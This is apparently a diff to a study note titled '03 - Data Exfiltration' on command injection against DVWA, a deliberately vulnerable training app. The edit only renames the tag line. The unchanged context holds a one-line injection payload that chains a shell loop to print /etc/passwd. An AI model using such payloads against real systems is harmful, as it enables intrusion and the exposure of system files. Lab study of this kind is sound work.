@@ -1,6 +1,6 @@
 # 03 - Data Exfiltration
 
-Search Tag: #command-injection #dvwa
+Search Tag(s): #command-injection #dvwa
 
 `; while read line; do echo $line; done < /etc/passwd`
 
